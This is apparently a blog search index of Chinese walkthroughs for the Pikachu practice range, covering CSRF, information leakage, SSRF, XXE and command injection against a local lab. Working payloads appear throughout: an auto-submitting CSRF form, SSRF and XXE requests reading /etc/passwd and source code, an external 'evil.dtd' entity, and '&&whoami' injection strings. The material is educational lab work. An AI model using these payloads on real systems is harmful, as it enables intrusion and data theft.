<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pikachu靶场系列-CSRF</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/CSRF/</url>
    <content><![CDATA[<h1 id="CSRF概述"><a href="#CSRF概述" class="headerlink" title="CSRF概述"></a>CSRF概述</h1><p>CSRF(Cross-Site Request Forgery)跨站请求伪造</p>
<p>在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击</p>
<p>看上去和XSS钓鱼的方式差不多，其实不一样</p>
<p>可以这么来理解：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作</p>
<p>比如现在有一个更改密码的请求，发送的数据包是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /changepass?pass=123456</span><br><span class="line">Host: x.x.x.x</span><br></pre></td></tr></table></figure>

<p>但是攻击者并没有更改密码的权限</p>
<p>于是构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://x.x.x.x/changepass?pass=123456</span><br></pre></td></tr></table></figure>

<p>发送给具备权限的用户，如果用户的后台处于登录状态，当点击该url时，则会触发更改密码的请求</p>
<p>所以可以看出其和XSS的区别，XSS不一定需要权限，或已经获得权限</p>
<p>而CSRF是借助别人的权限，执行正常的请求完成想要的攻击</p>
<p>CSRF中的C，可以理解为指的是被攻击者的浏览器，因为该攻击主要针对的就是被攻击者浏览器上所含有的权限</p>
<h1 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h1><p><img src="/images%5Cimage-20230109101126846.png" alt="image-20230109101126846"></p>
<p>根据提示随便登录一个账户</p>
<p><img src="/images%5Cimage-20230109101420309.png" alt="image-20230109101420309"></p>
<p>修改个人信息</p>
<p><img src="/images%5Cimage-20230109101557343.png" alt="image-20230109101557343"></p>
<p>可以获取更改个人信息的url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=chain&amp;email=vince%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>替换为想要更改的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=13888888888&amp;add=tianjin&amp;email=admin%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>然后登录其他的账户</p>
<p>此时的用户信息还是原先的信息</p>
<p><img src="/images%5Cimage-20230109101755800.png" alt="image-20230109101755800"></p>
<p>访问更改信息的url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=13888888888&amp;add=tianjin&amp;email=admin%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>刷新后可以看到kobe的用户信息已经更改</p>
<p><img src="/images%5Cimage-20230109101852497.png" alt="image-20230109101852497"></p>
<h1 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h1><p>POST类型的CSRF和GET的主要区别就是请求方式不同，从而导致发送的参数的位置不同。</p>
<p>GET的参数位置在URL的”?”后面</p>
<p>POST的参数在请求包的body中</p>
<p>由于POST的body无法直接发送给被攻击者，所以在利用POST的CSRF攻击时，需要自己构造一个html用于让被攻击者点击</p>
<p><img src="/images%5Cimage-20230109102350260.png" alt="image-20230109102350260"></p>
<p>根据提示随意登录一个用户</p>
<p>抓取更改用户信息的请求包</p>
<p><img src="/images%5Cimage-20230109102501800.png" alt="image-20230109102501800"></p>
<p>构造恶意网页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload = function() &#123;</span><br><span class="line">  document.getElementById(&quot;postsubmit&quot;).click();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;&gt;</span><br><span class="line">    &lt;input id=&quot;sex&quot; type=&quot;text&quot; name=&quot;sex&quot; value=&quot;ggg&quot; /&gt;</span><br><span class="line">    &lt;input id=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;13888888888&quot; /&gt;</span><br><span class="line">    &lt;input id=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;tianjing&quot; /&gt;</span><br><span class="line">    &lt;input id=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;admin@qq.com&quot; /&gt;</span><br><span class="line">    &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>该html会POST如下参数到<a href="http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfpost/csrf_post_edit.php">http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfpost/csrf_post_edit.php</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sex=ggg&amp;phonenum=13888888888&amp;add=tianjing&amp;email=admin%40qq.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>保存为test.html放置在自己的服务器</p>
<p><img src="/images%5Cimage-20230109102848481.png" alt="image-20230109102848481"></p>
<p>登录其他用户，此时信息还是原先的</p>
<p><img src="/images%5Cimage-20230109102933534.png" alt="image-20230109102933534"></p>
<p>访问恶意url</p>
<p><a href="http://127.0.0.1:88/test.html">http://127.0.0.1:88/test.html</a></p>
<p>刷新后用户信息已更改</p>
<p><img src="/images%5Cimage-20230109103037574.png" alt="image-20230109103037574"></p>
<h1 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h1><p>同样先按之前的步骤，登录，修改，抓包</p>
<p><img src="/images%5Cimage-20230109103833397.png" alt="image-20230109103833397"></p>
<p>可以发现和前两题相比，多出了一个token字段</p>
<p>该token在页面源代码中可以找到</p>
<p><img src="/images%5Cimage-20230109104040210.png" alt="image-20230109104040210"></p>
<p>而且该token在每次刷新时都会变化</p>
<p>所以并不能通过固定token实施攻击</p>
<p>但是在本地利用是可以的，可以借助burp的插件</p>
<p>在burp的应用市场就能下载，可以顺便下载下logger++</p>
<p><img src="/images%5Cimage-20230112151506245.png" alt="image-20230112151506245"></p>
<h3 id="CSRF-Token-Tracker"><a href="#CSRF-Token-Tracker" class="headerlink" title="CSRF Token Tracker"></a>CSRF Token Tracker</h3><p>可以先正常重发数据包看看</p>
<p>如果修改成功，状态码会为302，返回上层页面</p>
<p><img src="/images%5Cimage-20230112150010861.png" alt="image-20230112150010861"></p>
<p>再次重发，修改失败，没有重定向到上层页面</p>
<p><img src="/images%5Cimage-20230112150051584.png" alt="image-20230112150051584"></p>
<p>下面使用CSRF Token Tracker自动更新Token</p>
<p>设置CSRF Token Tracker，添加host和Name</p>
<p>Name就是请求包中指定token的字段</p>
<p><img src="/images%5Cimage-20230112150402891.png" alt="image-20230112150402891"></p>
<p><img src="/images%5Cimage-20230112151052925.png" alt="image-20230112151052925"></p>
<p>配置完成后再次返回repeater发包</p>
<p>此时都为302,修改成功</p>
<p><img src="/images%5Cimage-20230112151130778.png" alt="image-20230112151130778"></p>
<p>注意，在repeater中并不会看见token的变化</p>
<p>可以借助logger++插件</p>
<p><img src="/images%5Cimage-20230112151526121.png" alt="image-20230112151526121"></p>
<p>可以发现每一个token的值都不同</p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-敏感信息泄露</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
<p><img src="/images%5Cimage-20230110143848742.png" alt="image-20230110143848742"></p>
<p>成功登录</p>
<p><img src="/images%5Cimage-20230110144000741.png" alt="image-20230110144000741"></p>
<p>并且发现，该后台为未授权接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>

<p>不需要登录也能访问</p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-SSRF</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/SSRF/</url>
    <content><![CDATA[<h1 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h1><h3 id="服务端请求伪造"><a href="#服务端请求伪造" class="headerlink" title="服务端请求伪造"></a>服务端请求伪造</h3><p>字面意思就是伪造一个服务端请求，即攻击者借由服务端为跳板来攻击目标系统。</p>
<p><img src="/images%5Cimage-20230110155943810.png" alt="image-20230110155943810"></p>
<p>即我们能够访问到服务器，却访问不到目标机，但是服务器能访问到目标机</p>
<p>比如</p>
<p>服务器是某公司的公网边界机，目标机是该公司的内网机器</p>
<h5 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h5><p>利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等</p>
<h5 id="具体可能出现SSRF的地方"><a href="#具体可能出现SSRF的地方" class="headerlink" title="具体可能出现SSRF的地方"></a>具体可能出现SSRF的地方</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line"></span><br><span class="line">2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line"></span><br><span class="line">3.在线翻译：给网址翻译对应网页的内容</span><br><span class="line"></span><br><span class="line">4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line"></span><br><span class="line">5.图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</span><br><span class="line"></span><br><span class="line">6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试</span><br><span class="line"></span><br><span class="line">7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span><br><span class="line"></span><br><span class="line">8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</span><br><span class="line"></span><br><span class="line">9.邮件系统：比如接收邮件服务器地址</span><br><span class="line"></span><br><span class="line">10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</span><br><span class="line"></span><br><span class="line">11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</span><br><span class="line"></span><br><span class="line">12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</span><br></pre></td></tr></table></figure>

<h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞</p>
<h3 id="php涉及函数"><a href="#php涉及函数" class="headerlink" title="php涉及函数"></a>php涉及函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p><img src="/images%5Cimage-20230110160353697.png" alt="image-20230110160353697"></p>
<p>并且可以读取远程文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;http://www.baidu.com&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110160502725.png" alt="image-20230110160502725"></p>
<h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h5><p><img src="/images%5Cimage-20230110160606691.png" alt="image-20230110160606691"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fp = fsockopen(&quot;www.baidu.com&quot;, 80, $errno, $errstr, 30);</span><br><span class="line">if (!$fp) &#123;</span><br><span class="line">    echo &quot;$errstr ($errno)&lt;br /&gt;\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $out = &quot;GET / HTTP/1.1\r\n&quot;;</span><br><span class="line">    $out .= &quot;Host: www.baidu.com\r\n&quot;;</span><br><span class="line">    $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    while (!feof($fp)) &#123;</span><br><span class="line">        echo fgets($fp, 128);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110160659978.png" alt="image-20230110160659978"></p>
<h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h5><p>用于执行一个cURL会话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, &quot;http://www.baidu.com&quot;);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110160821031.png" alt="image-20230110160821031"></p>
<h1 id="SSRF-CURL"><a href="#SSRF-CURL" class="headerlink" title="SSRF(CURL)"></a>SSRF(CURL)</h1><p>起一台内网主机用于测试</p>
<p><img src="/images%5Cimage-20230110161236533.png" alt="image-20230110161236533"></p>
<p>点击后发现url指定了服务器访问的url，并将结果返回到前端</p>
<p><img src="/images%5Cimage-20230110161323352.png" alt="image-20230110161323352"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>结果返回到前端</p>
<p><img src="/images%5Cimage-20230110161521819.png" alt="image-20230110161521819"></p>
<h3 id="访问内网web"><a href="#访问内网web" class="headerlink" title="访问内网web"></a>访问内网web</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110161737693.png" alt="image-20230110161737693"></p>
<h3 id="探测主机信息"><a href="#探测主机信息" class="headerlink" title="探测主机信息"></a>探测主机信息</h3><h5 id="探测端口"><a href="#探测端口" class="headerlink" title="探测端口"></a>探测端口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com:4444</span><br></pre></td></tr></table></figure>

<p>baidu未开4444端口，所以会一直加载</p>
<p><img src="/images%5Cimage-20230110161709266.png" alt="image-20230110161709266"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110161737693.png" alt="image-20230110161737693"></p>
<p>192.168.28.150主机开启22222端口</p>
<h3 id="读取主机文件"><a href="#读取主机文件" class="headerlink" title="读取主机文件"></a>读取主机文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>更多利用方式参考</p>
<p><a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p>
<h1 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h1><p>利用方式和curl的类似</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=http://www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110162913976.png" alt="image-20230110162913976"></p>
<h5 id="探测主机端口"><a href="#探测主机端口" class="headerlink" title="探测主机端口"></a>探测主机端口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110162949382.png" alt="image-20230110162949382"></p>
<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=../../index.php</span><br></pre></td></tr></table></figure>

<p>查看页面源代码</p>
<p><img src="/images%5Cimage-20230110163139174.png" alt="image-20230110163139174"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-XXE</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/XXE/</url>
    <content><![CDATA[<h2 id="xml外部实体注入漏洞"><a href="#xml外部实体注入漏洞" class="headerlink" title="xml外部实体注入漏洞"></a>xml外部实体注入漏洞</h2><p>攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行</p>
<p>也就是说服务端接收和解析了来自用户端的xml数据，而又没有做严格的安全控制，从而导致xml外部实体注入。</p>
<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>xml是一种类似html的树形结构，用于数据的传输和存储</p>
<h5 id="一个xml文档实例"><a href="#一个xml文档实例" class="headerlink" title="一个xml文档实例"></a>一个xml文档实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>

<h5 id="XML声明部分-版本号与编码"><a href="#XML声明部分-版本号与编码" class="headerlink" title="XML声明部分(版本号与编码)"></a>XML声明部分(版本号与编码)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding==&quot;ISO-8859-1&quot;?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="文档类型定义-DTD"><a href="#文档类型定义-DTD" class="headerlink" title="文档类型定义(DTD)"></a>文档类型定义(DTD)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>文档类型定义(DTD)部分用来为XML文档定义语法约束，可以是内部声明也可以用来引用外部DTD。</p>
<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用于引入外部资源，有SYSTEM(本地)与PUBLIC(公用)两个关键词。</p>
<h5 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<h5 id="外部实体的引用可以借助如下协议"><a href="#外部实体的引用可以借助如下协议" class="headerlink" title="外部实体的引用可以借助如下协议"></a>外部实体的引用可以借助如下协议</h5><p>有点像php的伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///绝对路径</span><br><span class="line">http(s)://URL</span><br><span class="line">php://filter/read=convert.base64-encode/resource=绝对或相对路径</span><br></pre></td></tr></table></figure>

<p>不止这些，不同的语言支持的协议不同</p>
<p><img src="/images%5Cimage-20230110150940112.png" alt="image-20230110150940112"></p>
<h2 id="重点介绍实体声明"><a href="#重点介绍实体声明" class="headerlink" title="重点介绍实体声明"></a>重点介绍实体声明</h2><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>DTD实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
<p>XML实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe  &quot;sec test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>外部实体引用支持通过协议，来动态的获取值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>DTD实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，或可输入xml的位置</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
<p><img src="/images%5Cimage-20230110151826362.png" alt="image-20230110151826362"></p>
<p>则可能存在XXE漏洞</p>
<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h5 id="协议调用"><a href="#协议调用" class="headerlink" title="协议调用"></a>协议调用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110154213177.png" alt="image-20230110154213177"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2090744">https://cloud.tencent.com/developer/article/2090744</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;http://192.168.1.111/evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-RCE</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/RCE/</url>
    <content><![CDATA[<h1 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h1><p>remote command&#x2F;code execute</p>
<p>也叫做远程命令执行或远程代码执行</p>
<p>在实际中这可以归为最严重的漏洞，因为其可以获取到服务器权限</p>
<p>一些反序列化，远程调用等，只要能够执行系统命令，都可以归为RCE</p>
<p>比如log4j</p>
<h1 id="ping-RCE"><a href="#ping-RCE" class="headerlink" title="ping RCE"></a>ping RCE</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110095547449.png" alt="image-20230110095547449"></p>
<p>此时在服务器上执行的命令为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>

<p>然后将结果显示在前端</p>
<p>于是我们可以构造命令拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com&amp;&amp;whoami</span><br></pre></td></tr></table></figure>

<p>&amp;&amp;就是“与”</p>
<p><img src="/images%5Cimage-20230110095812452.png" alt="image-20230110095812452"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a||whoami</span><br></pre></td></tr></table></figure>

<p>||就是“或”</p>
<p><img src="/images%5Cimage-20230110095858437.png" alt="image-20230110095858437"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令A &amp;&amp; 命令B			# 只有前面的命令执行成功后才会执行后面的命令</span><br><span class="line">命令A &amp; 命令B			# 无论前面的命令执行成功或失败，总会执行后面的命令</span><br><span class="line">命令A || 命令B			# 当前面的命令执行失败才会执行后面的命令</span><br><span class="line">命令A | 命令B			# 前面的命令执行的输出作为后面命令执行的输入</span><br><span class="line">命令A ; 命令B			# 两条命令互不干扰</span><br></pre></td></tr></table></figure>

